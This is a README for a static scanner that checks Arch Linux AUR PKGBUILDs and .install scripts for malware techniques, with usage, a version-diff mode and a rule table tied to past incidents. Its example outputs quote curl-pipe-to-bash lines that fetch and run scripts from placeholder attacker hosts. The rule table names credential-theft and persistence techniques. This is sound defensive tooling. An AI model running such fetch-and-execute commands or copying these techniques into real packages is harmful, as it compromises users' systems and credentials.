# aur-manager

A static malware scanner for AUR PKGBUILDs and `.install` scripts.

AUR's trust model — anyone can adopt an orphaned package, and updates ship without
review — has repeatedly been abused to smuggle malware into real Arch Linux systems.
`aur-manager` scans a PKGBUILD (plus any `.install` scripts and patches sitting
alongside it) *before* you run `makepkg`, looking for the specific techniques that
have shown up in documented AUR incidents.

It never builds, downloads, or executes anything. It reads the files already on disk
and reports what it finds.

## Install

```sh
pip install .
# or, for an isolated CLI install:
pipx install .
```

## Usage

```sh
aur-manager scan <path>
```

`<path>` is either a `PKGBUILD` file or a directory containing one (an AUR git
checkout, typically) — any `*.install` scripts next to it are scanned too.
`*.patch`/`*.diff` files are located but not currently scanned (they're unified
diffs, not bash, so the existing rules don't apply to them directly).

```console
$ aur-manager scan ./some-aur-package
[CRITICAL] RCE001 — ./some-aur-package/PKGBUILD:24
    'build()' pipes the output of 'curl' directly into 'bash', executing remote content without any integrity check or human review.
    | curl -fsSL https://example.invalid/update-persistence.sh | bash
    Incident: AUR-2018-acroread

Overall verdict: CRITICAL (1 finding(s))

$ aur-manager scan ./a-clean-package
CLEAN: no findings
```

### Options

| Flag | Effect |
|---|---|
| `--json` | Machine-readable output instead of the text report. |
| `--fail-on {info,low,medium,high,critical}` | Exit code is `1` if the overall verdict is at or above this severity, else `0` (default: `high`). |
| `--severity-min {info,low,medium,high,critical}` | Only *display* findings at or above this severity — independent of `--fail-on`, so you can show everything but only gate CI on HIGH+. |
| `--rules RULE_ID,...` / `--exclude-rules RULE_ID,...` | Run only, or skip, specific rule ids. |
| `--no-color` | Disable ANSI colors in text output. |

### Exit codes

`0` clean (or below `--fail-on`) · `1` findings at/above `--fail-on`, including a
`META001` finding for a file that couldn't be fully parsed — that's an ordinary
finding subject to the same severity threshold, not a special case · `2` couldn't
resolve the path, load the files, or an invalid `--rules`/`--exclude-rules` id was
given.

## Comparing an update: `aur-manager diff`

```sh
aur-manager diff <old-path> <new-path>
```

Most real AUR compromises don't ship as a brand-new malicious package — they land
as an update to an already-trusted one, via maintainer account takeover or orphan
adoption. `scan` alone can't tell you that; it re-evaluates each version from
scratch. `diff` runs a full scan on both versions and separates the result into
what the update actually *changed*:

- **New findings** — present in the new version, not the old. This is the signal
  that matters most: a construct that wasn't there in a version people already
  trusted is a much stronger indicator than the same construct in a package
  nobody has vetted yet.
- **Carried findings** — present in both; pre-existing, not introduced by this
  update.
- **Resolved findings** — present in the old version, gone in the new one.
- Structural deltas independent of any rule firing: new/removed functions,
  new/removed `source=()` entries, and any source whose checksum coverage went
  from real to `SKIP`/missing between versions.

Since AUR packages are themselves git repositories, `<old-path>`/`<new-path>` are
typically two checkouts of consecutive commits (e.g. `git worktree add` at
`HEAD~1` and `HEAD`, or two clones).

```console
$ aur-manager diff ./innocent-tool-1.0.0 ./innocent-tool-1.0.1
=== New findings introduced in this update ===
[CRITICAL] RCE001 — ./innocent-tool-1.0.1/PKGBUILD:9
    'build()' pipes the output of 'curl' directly into 'bash', executing remote content without any integrity check or human review.
    | curl -fsSL https://evil.example.com/payload.sh | bash
    Incident: AUR-2018-acroread

Diff verdict: CRITICAL (1 new finding(s), 0 carried, 0 resolved)
```

Accepts the same `--json`, `--severity-min`, `--rules`/`--exclude-rules`, and
`--no-color` flags as `scan`. `--fail-on` (default `high`) gates on the **diff
verdict** — driven only by `new_findings` — not the new version's overall verdict,
so a pre-existing, already-carried finding doesn't by itself fail an update check.

### Running this automatically before every build

A scanner only helps if it actually runs. See
[`docs/integration.md`](docs/integration.md) for wiring `aur-manager` into
paru's `PreBuildCommand` or yay's `AURPreInstall` Lua hook, so scanning
happens on every build instead of requiring you to remember to run it.

## Rule provenance

Detection rules are grounded in documented AUR security incidents wherever one
exists, rather than being speculative pattern-matching. Each incident is
reconstructed as a **synthetic** regression fixture under `tests/fixtures/incidents/`
(never the original malicious code — placeholder domains, no working payloads) with
its citations in that fixture's `SOURCE.md`. A handful of rules are generic
heuristics not tied to one specific incident; those are marked `-` below and called
out explicitly rather than given a fabricated citation.

| Rule | Category | Severity | Incident |
|---|---|---|---|
| RCE001 | Remote code execution | CRITICAL | [2018 acroread AUR hijack](tests/fixtures/incidents/2018_acroread_curl_pipe_bash/SOURCE.md) — curl piped directly into bash |
| RCE002 | Remote code execution | CRITICAL | 2018 acroread — same technique via `source <(curl ...)` process substitution |
| RCE003 | Remote code execution | HIGH | generic heuristic — download-to-tempfile-then-execute |
| RCE004 | Remote code execution | HIGH | [2025 Chaos RAT AUR packages](tests/fixtures/incidents/2025_chaos_rat_disguised_source/SOURCE.md) — a `source=()` entry named like a patch file, actually executed |
| OBF001 | Obfuscation | CRITICAL | [2026 Atomic Arch campaign](tests/fixtures/incidents/2026_atomic_arch_install_hook_and_obfuscation/SOURCE.md) — `echo '<base64>' \| base64 -d \| bash` |
| OBF002 | Obfuscation | HIGH | generic heuristic — any `eval` usage |
| OBF003 | Obfuscation | MEDIUM | 2026 Atomic Arch — hex-escaped command strings |
| OBF004 | Obfuscation | HIGH | generic heuristic — rot13/`tr`-decode piped into a shell |
| PER001 | Persistence | HIGH | generic heuristic — writes to shell rc files |
| PER002 | Persistence | HIGH | generic heuristic — installs a crontab entry |
| PER003 | Persistence | HIGH | 2018 acroread — `systemctl enable/start` from a build/install script |
| PER004 | Persistence | MEDIUM | generic heuristic — writes to `~/.config/autostart/` |
| PER005 | Persistence | CRITICAL | generic heuristic — appends to `~/.ssh/authorized_keys` |
| PER006 | Persistence | HIGH | 2025 Chaos RAT + [2026 Atomic Arch](tests/fixtures/incidents/2026_atomic_arch_install_hook_and_obfuscation/SOURCE.md) — a binary dropped in `/tmp` disguised as a system process |
| PRV001 | Privilege escalation | CRITICAL | [2026 openconnect-sso incident](tests/fixtures/incidents/2026_openconnect_sso_sudo_privesc/SOURCE.md) — `sudo` inside `build()`/`package()` |
| PRV002 | Privilege escalation | CRITICAL | generic heuristic — direct `/etc/sudoers` edits |
| PRV003 | Privilege escalation | HIGH | generic heuristic — setting the setuid/setgid bit |
| EXF001 | Exfiltration | CRITICAL | 2026 Atomic Arch — reading `~/.ssh/` alongside an outbound network call |
| EXF002 | Exfiltration | CRITICAL | generic heuristic — same shape, targeting `~/.gnupg/` |
| EXF003 | Exfiltration | CRITICAL | 2026 Atomic Arch — same shape, targeting browser credential stores |
| EXF004 | Exfiltration | HIGH | generic heuristic — dumping the environment then uploading it |
| EXF005 | Exfiltration | CRITICAL | 2026 Atomic Arch — same shape, targeting developer/CI and cloud credential files (AWS/GCP/Azure, Docker, npm, git, `.netrc`, kubeconfig) |
| INT001 | Integrity | MEDIUM | generic heuristic — `pkgver()` making a live network call |
| INT002 | Integrity | MEDIUM | generic heuristic — a `source=()` URL pointing at a raw IP or a paste host |
| INT003 | Integrity | MEDIUM | generic heuristic — `SKIP` checksum on a plain network source |
| INT005 | Integrity | HIGH | 2026 Atomic Arch — a `.install` hook running `npm install`/etc. of an unpinned package |
| INT006 | Integrity | MEDIUM | generic heuristic — PKGBUILD's checksums/source count don't match the sibling `.SRCINFO` |
| META001 | Meta | HIGH | *(not an attack pattern)* — the file couldn't be fully parsed, so the scan is incomplete; don't trust a clean result on a file that also triggered this |

Full incident write-ups (dates, technique summaries, citations) live next to each
fixture in `tests/fixtures/incidents/*/SOURCE.md`.

### What it deliberately does *not* do

- **Doesn't fetch `source=()` URLs.** Scope is limited to files already present in
  the local checkout (PKGBUILD, `.install`, patches) — no network access, no
  extracting/scanning upstream tarballs.
- **No pkgname/source-domain typosquat check.** An early design considered flagging
  a `source=()` host that textually resembles a different, unrelated package name.
  Research into real AUR incidents found the dominant technique is trust inheritance
  via orphaned-package adoption, not typosquatting — and the check would false-positive
  constantly on ordinary packages (most legitimate sources have no name resemblance
  to their host at all). Shipping it would have added noise without a grounded reason
  to expect it catches anything real.
- **`INT006` doesn't compare `.SRCINFO`/PKGBUILD source *URLs* directly.** `.SRCINFO`
  is fully variable-resolved by makepkg (`source=("$pkgname-$pkgver.tar.gz::...")`
  becomes a literal string), while `ctx.sources` is the PKGBUILD's raw, unexpanded
  text — verified by running `makepkg --printsrcinfo` against a real PKGBUILD. A
  naive comparison would false-positive on nearly every real-world PKGBUILD, which
  almost universally templates `$pkgname`/`$pkgver` into source URLs. `INT006`
  compares checksums and array counts instead, which are never templated with bash
  variables.

## How detection works

PKGBUILD and `.install` files are bash, parsed with
[`bashlex`](https://github.com/idank/bashlex) into a real AST — this is the primary
detection layer, since regex-only scanning of shell scripts is easy to evade.
`bashlex` can't parse bash's array-literal syntax (`name=(...)`) at all, which
PKGBUILDs use pervasively (`source=()`, `depends=()`, ...); array-literal spans are
masked out before parsing and their contents extracted separately, so the AST layer
still sees real control flow (pipelines, `eval`, `sudo`, ...) while a small dedicated
tokenizer handles array data. A secondary regex-based layer is used only for
genuinely textual patterns the AST can't cleanly represent, such as base64 blobs or
hex-escape runs — never as the primary mechanism for control-flow detection.

Because PKGBUILD is *sourced* by makepkg, top-level statements run immediately when
the file loads, not only when a function is called — rules inspect that top-level
scope the same way they inspect `build()`/`package()`, not just the named
lifecycle functions.

## Development

```sh
pip install -e ".[dev]"
pytest
```

`tests/fixtures/incidents/` are the incident regression fixtures described above;
`tests/fixtures/benign/` are ordinary, non-malicious PKGBUILDs used as a
false-positive guard (`test_benign_fixture_has_no_high_severity_findings`).
